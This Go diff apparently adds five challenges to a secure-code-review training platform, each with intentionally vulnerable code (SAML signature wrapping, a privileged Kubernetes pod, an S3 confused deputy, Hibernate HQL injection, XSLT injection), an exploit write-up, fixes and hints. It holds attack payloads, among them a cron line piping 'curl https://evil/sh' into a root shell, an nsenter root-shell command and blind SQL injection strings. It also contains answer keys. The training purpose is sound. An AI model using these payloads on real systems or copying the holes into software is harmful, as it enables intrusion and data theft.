@@ -9,6 +9,11 @@ func buildOSCPChallenges() []challengeSeed {
 		oscpPythonJWTKidPathTraversal(),
 		oscpNodeServerSideProtoPollutionRCE(),
 		oscpGoGRPCStreamAuthBypass(),
+		oscpJavaSAMLXSWSigWrap(),
+		oscpBashK8sPrivilegedPodEscape(),
+		oscpPythonAWSConfusedDeputy(),
+		oscpJavaHibernateHQLInjection(),
+		oscpPythonXSLTInjectionRCE(),
 	}
 }
 
@@ -583,6 +588,791 @@ THIS account.
 			"Even if the interceptor ran, the Subscribe method itself takes req.AccountId at face value. Is there an authorization check inside the handler body?",
 		},
 		vulnerableLines: []int{50, 64},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 5 — SAML XML Signature Wrapping (XSW)
+// Difficulty 9 — Validator decouples signature scope from attribute scope.
+// ──────────────────────────────────────────────────
+func oscpJavaSAMLXSWSigWrap() challengeSeed {
+	return challengeSeed{
+		title:        "Signature Sleight — SAML XML Signature Wrapping",
+		slug:         "java-saml-xsw-signature-wrapping",
+		difficulty:   9,
+		langSlug:     "java",
+		catSlug:      "auth-bypass",
+		points:       700,
+		cveReference: "CWE-347 / well-known SAML XSW attack class",
+		description: `A Java enterprise SSO gateway accepts SAML 2.0 Responses from a
+trusted upstream identity provider. The gateway validates the XML
+digital signature on each response, then extracts the Subject NameID
+and Role attribute to authorize the user against the application's
+RBAC layer.
+
+The pattern has been in production for three years. A recent SSO red
+team engagement reported that the gateway lets any holder of a
+legitimate signed response forge an "admin" session — without
+breaking the signature.
+
+Find the assumption baked into the validator that lets the signature
+check pass while the attribute extraction reads attacker-controlled
+data.`,
+		code: `package com.example.saml;
+
+import java.io.ByteArrayInputStream;
+import java.security.PublicKey;
+import java.util.Optional;
+import javax.xml.crypto.dsig.XMLSignatureFactory;
+import javax.xml.crypto.dsig.dom.DOMValidateContext;
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.NodeList;
+
+public class SAMLAssertionValidator {
+
+    private static final String DS_NS   = "http://www.w3.org/2000/09/xmldsig#";
+    private static final String SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion";
+
+    private final PublicKey idpPublicKey;
+
+    public SAMLAssertionValidator(PublicKey idpPublicKey) {
+        this.idpPublicKey = idpPublicKey;
+    }
+
+    public Optional<Principal> validate(String responseXml) throws Exception {
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+        dbf.setNamespaceAware(true);
+        DocumentBuilder db = dbf.newDocumentBuilder();
+        Document doc = db.parse(
+            new ByteArrayInputStream(responseXml.getBytes("UTF-8")));
+
+        NodeList sigs = doc.getElementsByTagNameNS(DS_NS, "Signature");
+        if (sigs.getLength() == 0) {
+            return Optional.empty();
+        }
+        DOMValidateContext ctx = new DOMValidateContext(idpPublicKey, sigs.item(0));
+        XMLSignatureFactory fac = XMLSignatureFactory.getInstance("DOM");
+        if (!fac.unmarshalXMLSignature(ctx).validate(ctx)) {
+            return Optional.empty();
+        }
+
+        NodeList assertions = doc.getElementsByTagNameNS(SAML_NS, "Assertion");
+        if (assertions.getLength() == 0) {
+            return Optional.empty();
+        }
+        Element assertion = (Element) assertions.item(0);
+        return Optional.of(parsePrincipal(assertion));
+    }
+
+    private Principal parsePrincipal(Element assertion) {
+        NodeList names = assertion.getElementsByTagNameNS(SAML_NS, "NameID");
+        String subject = names.item(0).getTextContent();
+        String role = assertion.getAttribute("Role");
+        return new Principal(subject, role);
+    }
+}`,
+		targetVuln: `Classic XML Signature Wrapping (XSW) — the validator never
+establishes that the signed XML region is the SAME region from which
+it extracts the user's identity.
+
+Step 1 finds the first <ds:Signature> in the document by tag name and
+verifies it cryptographically. This passes against a legitimately-signed
+inner assertion that the attacker copied verbatim from a real response.
+
+Step 2 finds the first <saml:Assertion> in the document by tag name
+and reads NameID + Role from it. This is a SEPARATE DOM lookup; it does
+NOT walk down from the signed element or check that the assertion it
+returns is a descendant of (or is) the signed scope.
+
+Attack payload (XSW-style outline):
+
+  <samlp:Response>
+    <saml:Assertion Role="admin">              <!-- attacker, FIRST -->
+      <saml:Subject>
+        <saml:NameID>victim@example.com</saml:NameID>
+      </saml:Subject>
+    </saml:Assertion>
+    <saml:Assertion Role="user">               <!-- legit, signed -->
+      <ds:Signature>...valid signature over THIS assertion...</ds:Signature>
+      <saml:Subject><saml:NameID>victim@example.com</saml:NameID></saml:Subject>
+    </saml:Assertion>
+  </samlp:Response>
+
+When validate() runs:
+  - sigs.item(0) finds the inner ds:Signature → cryptographic check
+    succeeds (the referenced element is intact).
+  - assertions.item(0) returns the FIRST <Assertion> in document order
+    — the attacker's wrapper with Role="admin".
+  - parsePrincipal reads Role="admin" off the attacker's assertion.
+
+The gateway hands the application a Principal("victim@example.com",
+"admin") and the RBAC layer happily admits the request. No private key
+compromise, no signature forgery — just a single replayed wrapper
+around the attacker's payload.`,
+		conceptualFix: `Anchor attribute extraction to the signed element, not to a global
+DOM lookup.
+
+1. Use the Reference URI from the signature to locate the signed
+   element, then read attributes only from THAT element:
+
+       XMLSignature sig = fac.unmarshalXMLSignature(ctx);
+       if (!sig.validate(ctx)) return Optional.empty();
+
+       String refURI = sig.getSignedInfo().getReferences()
+                          .get(0).getURI();   // "#assertion-id-..."
+       Element signed = doc.getElementById(refURI.substring(1));
+       if (signed == null) return Optional.empty();
+       return Optional.of(parsePrincipal(signed));
+
+2. Mark the SAML id attributes as XML ID via Schema/DTD so
+   getElementById() works. Without an explicit ID schema, attribute
+   IDs are ignored and the lookup silently returns null — many SAML
+   libraries get this wrong.
+
+3. Defense in depth:
+   - Reject responses with more than one <Assertion>.
+   - Reject responses where the signed element is not the document
+     root assertion (a stricter policy than the bare standard).
+   - Use a hardened SAML library (OpenSAML, Spring Security SAML,
+     Keycloak SAML adapter) that handles XSW1-8 correctly.
+   - Add structural checks: assertion must be an immediate child of
+     the Response, signature must be an immediate child of the
+     assertion it covers.
+
+4. Long-term: migrate to OIDC where signature scope is the entire
+   JWT and the signed region is the parsed region — no XML
+   wrapping ambiguity.`,
+		hints: []string{
+			"Search for 'SAML XSW' or 'XML Signature Wrapping'. What's the relationship between the signed element and the element the parser actually reads?",
+			"The validator calls getElementsByTagNameNS twice — once for Signature and once for Assertion. Does it check that they belong to the same subtree?",
+			"What happens if you take a legitimately signed assertion and ADD another assertion as the first child of <samlp:Response>?",
+		},
+		vulnerableLines: []int{32, 42},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 6 — Kubernetes privileged-pod escape via deploy-pipeline RBAC
+// Difficulty 8 — RBAC + pod-security combo that gives any holder of
+// the deploy service-account token root on every node.
+// ──────────────────────────────────────────────────
+func oscpBashK8sPrivilegedPodEscape() challengeSeed {
+	return challengeSeed{
+		title:        "Trojan Migration — K8s Privileged-Pod Cluster Escape",
+		slug:         "bash-k8s-privileged-pod-escape",
+		difficulty:   8,
+		langSlug:     "bash",
+		catSlug:      "broken-access",
+		points:       600,
+		cveReference: "CWE-269 / canonical K8s privesc pattern",
+		description: `A SaaS team ships its application via a GitOps pipeline. The CI
+runner authenticates to the production cluster with a ServiceAccount
+token (deploy-sa) and applies the manifests below. The deploy-sa token
+also lives in the runner's Vault and is mounted into every CI job.
+
+Any contributor with PR-merge permission on the infrastructure repo
+can submit Helm values that change the migration job's image. The team
+considered that risk and decided "it's fine — the job only runs in the
+app-prod namespace."
+
+Identify the chain of misconfigurations that turns "PR merge in
+infra-repo" into "root on every Kubernetes worker node."`,
+		code: `apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: app-prod
+  name: deploy-pod-creator
+rules:
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["create", "get", "list", "watch", "delete"]
+- apiGroups: [""]
+  resources: ["pods/exec"]
+  verbs: ["create"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  namespace: app-prod
+  name: deploy-can-create-pods
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: deploy-pod-creator
+subjects:
+- kind: ServiceAccount
+  name: deploy-sa
+  namespace: app-prod
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: db-migration-job
+  namespace: app-prod
+spec:
+  template:
+    spec:
+      serviceAccountName: deploy-sa
+      containers:
+      - name: migrate
+        image: app-org/migrate:latest
+        command: ["/app/migrate", "up"]
+        securityContext:
+          privileged: true
+          runAsUser: 0
+        volumeMounts:
+        - name: host-root
+          mountPath: /host
+      volumes:
+      - name: host-root
+        hostPath:
+          path: /
+          type: Directory
+      restartPolicy: Never`,
+		targetVuln: `Three independent misconfigurations chain into a full node escape.
+None is exploitable alone; together they collapse the cluster's
+isolation boundary.
+
+1. RBAC: pods/exec verb (line 11).
+   The deploy-sa Role grants "create" on the "pods/exec" subresource.
+   This is the verb that backs "kubectl exec -ti <pod> -- /bin/sh".
+   With this verb plus "create" on pods, any holder of the token can
+   start a new pod AND then drop a shell inside it.
+
+2. Pod SecurityContext: privileged + UID 0 (line 43).
+   "privileged: true" disables the container runtime's seccomp,
+   AppArmor, and capability filters. The container runs with all
+   Linux capabilities, can mount block devices, and can issue
+   syscalls that touch the kernel directly.
+
+3. Volume: hostPath / mounted at /host (line 51).
+   hostPath: "/" mounts the worker node's root filesystem into the
+   container. Combined with privileged=true, the container can:
+     - chroot /host /bin/sh   — fully escape into the host namespace
+     - read /host/etc/shadow, /host/root/.ssh/authorized_keys
+     - read /host/var/lib/kubelet/pods/.../kube-api-access-*/token
+       — the kubelet's bootstrap creds OR any other pod's SA token
+     - write /host/var/lib/kubelet to persist
+     - access /host/var/run/docker.sock or containerd's sock
+
+Exploit:
+  Attacker merges a PR that swaps the migrate image to a benign-
+  looking shim. When the CI pipeline applies it, the Job runs the
+  shim, which sleeps. The attacker, using the deploy-sa token leaked
+  from the CI runner, runs:
+
+      kubectl exec -ti db-migration-job-xyz -- nsenter --target 1
+                                                       --mount --uts
+                                                       --ipc --net
+                                                       --pid -- /bin/bash
+
+  And now has a root shell in the worker node's PID 1 namespace. From
+  there: dump every other pod's tokens, pivot to the API server,
+  exfiltrate all secrets in the cluster.`,
+		conceptualFix: `Apply at every layer of the chain.
+
+1. Remove pods/exec from deploy-sa.
+   Migration jobs run themselves; the deploy service account never
+   needs to drop interactive shells. If exec is needed for debugging,
+   create a SEPARATE role bound only to specific human accounts and
+   only in a separate troubleshooting namespace.
+
+2. Drop privileged + runAsUser:0 + hostPath.
+   The migration job is a CLI talking to PostgreSQL — it needs no
+   host access and no root.
+
+       securityContext:
+         allowPrivilegeEscalation: false
+         readOnlyRootFilesystem: true
+         runAsNonRoot: true
+         runAsUser: 1000
+         capabilities:
+           drop: ["ALL"]
+       # remove the host-root volume entirely
+
+3. Enforce at the cluster level. Even if a manifest tries to
+   reintroduce the misconfig, the cluster should refuse it:
+
+   - Pod Security Admission "restricted" profile on app-prod:
+       kubectl label namespace app-prod \
+         pod-security.kubernetes.io/enforce=restricted
+   - OR a Kyverno / OPA Gatekeeper policy that denies privileged,
+     denies hostPath, denies runAsUser=0.
+
+4. Tighten the CI trust model. The deploy-sa token should be
+   short-lived (use BoundServiceAccountTokenVolume + projected
+   tokens with audience binding), and the CI runner should pull
+   the token at job start with a workload-identity exchange — never
+   long-lived in Vault.
+
+5. Audit: alert on any new pod with privileged=true, hostPath, or
+   capabilities.add that includes SYS_ADMIN.`,
+		hints: []string{
+			"Look at every key under securityContext. Which of them disable container isolation?",
+			"What does the pods/exec RBAC verb let you do once you can also create pods?",
+			"Trace what /host would contain if it were mounted from path: '/'. What files could a root-uid privileged container read or write through it?",
+		},
+		vulnerableLines: []int{11, 42, 50},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 7 — AWS confused-deputy via caller-controlled S3 bucket name
+// Difficulty 8 — IAM role's permissions exceed the per-request authz.
+// ──────────────────────────────────────────────────
+func oscpPythonAWSConfusedDeputy() challengeSeed {
+	return challengeSeed{
+		title:        "The Borrowed Badge — AWS S3 Confused Deputy",
+		slug:         "python-aws-s3-confused-deputy",
+		difficulty:   8,
+		langSlug:     "python",
+		catSlug:      "broken-access",
+		points:       600,
+		cveReference: "CWE-441 (confused deputy)",
+		description: `A multi-tenant SaaS exposes a thumbnail-preview endpoint. The Python
+worker process runs on EC2 with an instance profile granting
+s3:GetObject on tenant-specific upload buckets AND on a separate set
+of cross-tenant "shared internal reports" buckets the platform team
+uses to ship aggregated analytics.
+
+Every tenant has its own tenant_id. The preview API takes a bucket
+and key from the request body. Authentication is enforced by an
+upstream JWT-verifying proxy; the worker reads the tenant from the
+X-Tenant-Id header the proxy attaches.
+
+Find the bug that lets tenant A read tenant B's most sensitive
+internal reports, and explain why "but the JWT is verified upstream"
+does not save us.`,
+		code: `import boto3
+import logging
+from io import BytesIO
+from flask import Flask, request, jsonify, send_file
+
+app = Flask(__name__)
+logger = logging.getLogger(__name__)
+
+s3 = boto3.client("s3")
+
+
+@app.route("/api/preview", methods=["POST"])
+def preview():
+    body = request.get_json(force=True)
+    bucket = body.get("bucket")
+    key = body.get("key")
+    if not bucket or not key:
+        return jsonify({"error": "bucket and key required"}), 400
+
+    tenant_id = request.headers.get("X-Tenant-Id", "unknown")
+    logger.info("preview: tenant=%s bucket=%s key=%s", tenant_id, bucket, key)
+
+    obj = s3.get_object(Bucket=bucket, Key=key)
+    data = obj["Body"].read()
+
+    return send_file(
+        BytesIO(data),
+        mimetype=obj.get("ContentType", "application/octet-stream"),
+        download_name=key.split("/")[-1],
+    )
+
+
+@app.route("/api/upload", methods=["POST"])
+def upload():
+    tenant_id = request.headers.get("X-Tenant-Id", "unknown")
+    bucket = f"tenant-{tenant_id}-uploads"
+    key = request.form["key"]
+    data = request.files["file"].read()
+    s3.put_object(Bucket=bucket, Key=key, Body=data)
+    return jsonify({"status": "uploaded", "bucket": bucket, "key": key})
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8000)`,
+		targetVuln: `A textbook confused-deputy: the worker holds permissions that
+exceed the per-request authorization check.
+
+Flaw 1 — bucket name comes from the request body (line 15).
+The preview endpoint takes "bucket" straight from request.get_json().
+There is no allowlist, no derivation from tenant_id, no prefix check.
+The caller supplies the bucket. Combined with the next flaw, this is
+the entire vulnerability.
+
+Flaw 2 — the call uses the EC2 instance's broad IAM role (line 23).
+boto3.client("s3") was constructed at import time with no
+credentials argument, so it inherits the EC2 instance profile. That
+profile grants s3:GetObject on tenant-specific buckets AND on
+"shared-internal-reports-*" buckets. The worker is the deputy; its
+authority extends well past any single tenant's data.
+
+Why the upstream JWT does not save us:
+  - The upstream proxy verified that the caller holds a valid JWT for
+    some tenant_id. It did NOT verify that the caller may read the
+    bucket the caller named — because the proxy has no idea what
+    buckets mean in the worker's IAM policy.
+  - The X-Tenant-Id header is used only for logging. Even if it were
+    used for an authorization decision, the caller could spoof it
+    inside the trust boundary (the proxy might not strip it).
+  - Even a fully-trusted tenant_id does not constrain the bucket
+    parameter. The worker still calls get_object on whatever the
+    caller names.
+
+Exploit:
+  Tenant A sends:
+      POST /api/preview
+      Authorization: Bearer <valid JWT for tenant A>
+      X-Tenant-Id: tenant-A
+      Content-Type: application/json
+      {"bucket": "shared-internal-reports-2024-q4",
+       "key": "tenant-B/financials.pdf"}
+
+  The worker:
+    - sees a valid request,
+    - calls s3.get_object on a bucket the worker has permission to read,
+    - returns tenant B's financials to tenant A.
+
+The vulnerability does not require any credential theft; the attacker
+uses the worker's deputy permissions through the API surface as
+designed.`,
+		conceptualFix: `Two complementary fixes — both required.
+
+1. Stop trusting caller-named buckets.
+   Derive the bucket from the authenticated tenant identity, never
+   from the request body:
+
+       VALID_TENANT_BUCKETS = {tenant: f"tenant-{tenant}-uploads"
+                               for tenant in known_tenants()}
+       tenant_id = verify_jwt_locally(request.headers["Authorization"])
+       bucket = VALID_TENANT_BUCKETS[tenant_id]   # caller cannot override
+
+   If the endpoint must accept ANY bucket name (e.g. cross-tenant
+   admin tooling), require an explicit allowlist check that consults
+   the authenticated identity:
+
+       if not is_authorized(tenant_id, bucket):
+           return jsonify({"error": "forbidden"}), 403
+
+2. Tighten the IAM role to least privilege.
+   The worker should have one of:
+     - per-tenant role assumption via STS AssumeRole, so the working
+       credentials are bounded by the authenticated tenant; OR
+     - per-resource IAM policy keyed off
+       aws:PrincipalTag/tenant_id = ${s3:ExistingObjectTag/tenant_id}
+       (object-tag-based authorization).
+   Cross-tenant report buckets should NOT be in the same role as
+   per-tenant upload buckets. Use a separate IAM role for the reports
+   pipeline, and route reports access through a dedicated service
+   the API surface cannot reach.
+
+3. Defense in depth:
+   - Re-verify the JWT inside the worker (don't trust an upstream
+     header). Use python-jose or PyJWT with strict aud/iss checks.
+   - S3 bucket policies should require sts:RequestTag/tenant_id to
+     match the object's tenant tag, so even a confused deputy gets
+     a deny from the bucket itself.
+   - Audit CloudTrail for cross-tenant GetObject calls.`,
+		hints: []string{
+			"Find every value that flows from the request into an AWS API call. Which of them is the most dangerous in the hands of a malicious tenant?",
+			"What permissions does boto3.client('s3') inherit when no credentials are passed? How broad is the EC2 instance role here?",
+			"The upstream proxy verifies the JWT. Does verifying the JWT prove the caller may read THIS bucket, or only that the caller is some authenticated tenant?",
+		},
+		vulnerableLines: []int{15, 23},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 8 — Hibernate HQL injection via string-concatenated sort field
+// Difficulty 7 — ORM-flavored SQLi that survives a casual code review.
+// ──────────────────────────────────────────────────
+func oscpJavaHibernateHQLInjection() challengeSeed {
+	return challengeSeed{
+		title:        "The ORM Mirage — Hibernate HQL Injection",
+		slug:         "java-hibernate-hql-injection",
+		difficulty:   7,
+		langSlug:     "java",
+		catSlug:      "injection",
+		points:       500,
+		cveReference: "CWE-89 (manifested through HQL, not raw SQL)",
+		description: `An internal CRM exposes a user-search endpoint backed by a Spring
+@Service that talks to PostgreSQL through Hibernate. The service is
+behind admin auth, but the admin tier has 40+ analysts, including
+recently onboarded contractors.
+
+The team treats Hibernate as inherently safe ("we use the ORM, so we
+can't have SQLi"). A pen test report flagged the search endpoint as
+"medium" but the engineering lead pushed back: "we never call
+session.createNativeQuery — only createQuery on POJO entities."
+
+Find why the lead is wrong, and identify the smallest payload that
+exfiltrates the password_hash column from the users table.`,
+		code: `package com.example.usersearch;
+
+import java.util.List;
+import org.hibernate.Session;
+import org.hibernate.SessionFactory;
+import org.hibernate.query.Query;
+import org.springframework.stereotype.Service;
+
+@Service
+public class UserSearchService {
+
+    private final SessionFactory sessionFactory;
+
+    public UserSearchService(SessionFactory sf) {
+        this.sessionFactory = sf;
+    }
+
+    public List<UserProfile> searchByName(String name, String sortField) {
+        Session session = sessionFactory.openSession();
+        try {
+            String hql = "FROM UserProfile u " +
+                         "WHERE u.displayName LIKE '%" + name + "%' " +
+                         "ORDER BY u." + sortField;
+            Query<UserProfile> q = session.createQuery(hql, UserProfile.class);
+            q.setMaxResults(50);
+            return q.list();
+        } finally {
+            session.close();
+        }
+    }
+
+    public UserProfile findById(Long id) {
+        try (Session session = sessionFactory.openSession()) {
+            Query<UserProfile> q = session.createQuery(
+                "FROM UserProfile u WHERE u.id = :id", UserProfile.class);
+            q.setParameter("id", id);
+            return q.uniqueResult();
+        }
+    }
+}`,
+		targetVuln: `HQL injection via two concatenated user inputs in searchByName.
+
+Line 22 — the displayName filter:
+   "WHERE u.displayName LIKE '%" + name + "%' "
+   The "name" parameter is concatenated into a quoted string. A
+   payload of:  ' OR 1=1 OR '
+   collapses the WHERE clause and dumps the entire UserProfile table.
+
+Line 23 — the sort field:
+   "ORDER BY u." + sortField
+   sortField is concatenated into the ORDER BY clause. Because HQL
+   permits arbitrary path expressions and supports UNION through
+   subqueries on JPA entities, sortField like:
+       (SELECT u2.passwordHash FROM UserProfile u2 WHERE u2.id = 1)
+   uses the database's ORDER BY behavior (ordering by a computed
+   value) to leak data via timing or via blind boolean conditions:
+       sortField = "displayName) WHERE (1 = (CASE WHEN
+                    (SELECT SUBSTRING(passwordHash, 1, 1) FROM UserProfile
+                     WHERE id = 1) = 'a' THEN 1 ELSE 0 END"
+
+Why "we use the ORM" does not save the code:
+   - Hibernate's createQuery() compiles HQL into SQL. It parameterizes
+     only the values you explicitly bind via setParameter() or :named
+     placeholders. ANY substring you stuff into the HQL string itself
+     is part of the query language, not a value. Concatenation in HQL
+     is the same as concatenation in raw SQL.
+   - findById on line 33-35 shows the correct pattern — :id named
+     parameter. The developer knew the right way; chose the wrong way
+     for searchByName.
+
+Net effect: the "trusted internal admin" surface gives any analyst a
+direct path to dump password_hash, MFA seeds, session keys, anything
+that ends up as a column on a JPA entity that the search service can
+see via HQL.`,
+		conceptualFix: `Make every user-derived fragment a bound parameter or a
+strict allowlist.
+
+1. Bind the LIKE pattern:
+       String hql = "FROM UserProfile u " +
+                    "WHERE u.displayName LIKE :pattern " +
+                    "ORDER BY u." + safeSortField(sortField);
+       Query<UserProfile> q = session.createQuery(hql, UserProfile.class);
+       q.setParameter("pattern", "%" + name + "%");
+   The "%" wildcards are added to the BOUND value, not concatenated
+   into the query language.
+
+2. Allowlist the sort field. ORDER BY cannot be parameterized in JDBC
+   or HQL — it is the query language, not a value. The fix is a
+   compile-time set of allowed field names:
+
+       private static final Set<String> SORT_FIELDS =
+           Set.of("displayName", "createdAt", "lastLoginAt");
+
+       private String safeSortField(String s) {
+           if (!SORT_FIELDS.contains(s)) {
+               throw new IllegalArgumentException("invalid sort: " + s);
+           }
+           return s;
+       }
+
+3. Use the Criteria API (or JPA Specification) for dynamic queries.
+   The Criteria API forces all values through bound parameters and
+   forces all column references through entity metamodel handles,
+   which the compiler checks:
+
+       CriteriaBuilder cb = session.getCriteriaBuilder();
+       CriteriaQuery<UserProfile> cq = cb.createQuery(UserProfile.class);
+       Root<UserProfile> u = cq.from(UserProfile.class);
+       cq.where(cb.like(u.get("displayName"), "%" + name + "%"));
+       cq.orderBy(cb.asc(u.get(safeSortField(sortField))));
+       return session.createQuery(cq).setMaxResults(50).getResultList();
+
+4. Defense in depth:
+   - The search-tier DB user should have SELECT only on the columns
+     the search exposes — not on password_hash, mfa_seed, etc.
+   - Log HQL with abnormal subquery structure or LENGTH > N.
+   - Run HQL-aware SAST (e.g. SpotBugs-FindSecBugs) in CI.`,
+		hints: []string{
+			"Compare searchByName with findById. The findById method uses :id — what does the searchByName method do differently?",
+			"Look at every '+' operator in the searchByName method. Which operands flow from request parameters?",
+			"ORDER BY in HQL cannot be a bound parameter — it must literally be a path expression. How would you safely accept user input for the sort field?",
+		},
+		vulnerableLines: []int{22, 23},
+	}
+}
+
+// ──────────────────────────────────────────────────
+// OSCP 9 — XSLT injection via lxml.etree.XSLT with attacker stylesheet
+// Difficulty 8 — Custom report engine accepts user XSL → RCE via
+// libxslt extension elements (exsl:document, php:function, ...).
+// ──────────────────────────────────────────────────
+func oscpPythonXSLTInjectionRCE() challengeSeed {
+	return challengeSeed{
+		title:        "The Stylesheet of Doom — XSLT Injection → RCE",
+		slug:         "python-xslt-injection-rce",
+		difficulty:   8,
+		langSlug:     "python",
+		catSlug:      "ssti",
+		points:       600,
+		cveReference: "CWE-91 (XML injection / XSLT)",
+		description: `A Python reporting service lets enterprise customers ship custom
+XSL stylesheets to render compliance reports against the day's data
+snapshot. The service is deployed on Kubernetes with read-write
+access to /var/lib/reports and outbound HTTPS to the corporate
+artifact registry.
+
+The team chose XSLT specifically because "it's just a templating
+language — there's no eval()." The lxml library was preferred because
+"it parses faster than the stdlib".
+
+Find the vulnerability that lets a customer-supplied stylesheet escape
+the templating model entirely and execute code in the worker process.`,
+		code: `from flask import Flask, request, jsonify, Response
+from lxml import etree
+
+app = Flask(__name__)
+
+REPORT_DATA = etree.parse("/var/lib/reports/snapshot.xml")
+
+
+@app.route("/api/report/render", methods=["POST"])
+def render_report():
+    xsl_body = request.get_data(as_text=True)
+    if not xsl_body:
+        return jsonify({"error": "missing stylesheet"}), 400
+
+    try:
+        stylesheet_doc = etree.fromstring(xsl_body.encode("utf-8"))
+        transform = etree.XSLT(stylesheet_doc)
+        result = transform(REPORT_DATA)
+        return Response(str(result), mimetype="application/xml")
+    except etree.XSLTApplyError as e:
+        return jsonify({"error": "xslt apply failed", "detail": str(e)}), 500
+    except etree.XMLSyntaxError as e:
+        return jsonify({"error": "xslt parse failed", "detail": str(e)}), 400
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)`,
+		targetVuln: `XSLT is not "just a templating language" — it is a Turing-complete
+declarative language whose libxslt implementation ships a set of
+extension elements that interact with the host filesystem and process.
+
+Flaw — etree.XSLT(stylesheet_doc) with attacker-supplied stylesheet
+(lines 16-17).
+
+The user-supplied XSL is parsed into stylesheet_doc and passed
+directly to etree.XSLT() with default settings. By default lxml's
+XSLT engine enables:
+
+  - exsl:document  — writes arbitrary files to the worker's filesystem
+                     (anywhere the worker user can write).
+  - xsl:include / xsl:import + URI resolver — fetches stylesheets
+                     over HTTP(S) and file://, enabling SSRF and
+                     local-file read into the rendered output.
+  - <xsl:value-of select="document('file:///etc/passwd')"/> —
+                     leaks any file readable by the worker into the
+                     response body.
+  - php:function / dyn:evaluate (when bound) — direct code execution
+                     in older libxslt builds.
+
+Exploit (file-write → cron RCE chain):
+
+  POST /api/report/render
+  Content-Type: application/xml
+  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                  xmlns:exsl="http://exslt.org/common"
+                  version="1.0">
+    <xsl:template match="/">
+      <exsl:document href="file:///var/lib/reports/../../etc/cron.d/x"
+                     method="text">
+* * * * * root curl https://evil/sh | sh
+      </exsl:document>
+    </xsl:template>
+  </xsl:stylesheet>
+
+The worker writes /etc/cron.d/x; the next minute cron executes the
+shell as root.
+
+Even without exsl:document, the document() function reads any file
+the worker has access to and embeds it in the response. From a
+multi-tenant standpoint that's already a critical disclosure: the
+attacker reads other tenants' snapshots, /proc/self/environ
+(secrets), kubelet service-account tokens, etc.`,
+		conceptualFix: `XSLT cannot be safely run against attacker-supplied stylesheets
+without explicit hardening. Apply the full set:
+
+1. Pass a hardened parser and disable extensions:
+       parser = etree.XMLParser(
+           resolve_entities=False,   # no external entities
+           no_network=True,          # no network fetches
+           load_dtd=False,
+       )
+       stylesheet_doc = etree.fromstring(
+           xsl_body.encode("utf-8"), parser=parser)
+
+       transform = etree.XSLT(
+           stylesheet_doc,
+           access_control=etree.XSLTAccessControl.DENY_ALL,
+       )
+   XSLTAccessControl.DENY_ALL blocks file:// and http:// from the
+   transform context (document(), xsl:include, xsl:import, etc.).
+
+2. Compile and freeze stylesheets server-side.
+   Treat XSLT like server code: have the security team review each
+   stylesheet, sign it, and store a hash. The render endpoint accepts
+   only a stylesheet ID, looks up the hash, and applies the
+   pre-compiled transform. Customers never submit raw XSL at request
+   time.
+
+3. Sandbox the worker.
+   Even if the XSLT engine is hardened, run the renderer with:
+     - read-only filesystem (or writable only to /tmp with no setuid),
+     - no network egress except to the artifact registry,
+     - seccomp filter blocking execve, ptrace, mount,
+     - a non-root user with no access to other tenants' snapshots.
+
+4. Switch templating engines.
+   If the requirements are "render XML data with a template" — use
+   Jinja2 with autoescape, or a structured template language like
+   Liquid or Mustache. They lack file/network primitives by design.`,
+		hints: []string{
+			"Read the lxml documentation for etree.XSLT. What does access_control default to, and what does it permit?",
+			"Search for 'libxslt extension elements'. Which ones write files or fetch URLs?",
+			"What does the XSLT document() function do when given a file:// URL?",
+		},
+		vulnerableLines: []int{16, 17},
 	}
 }
 
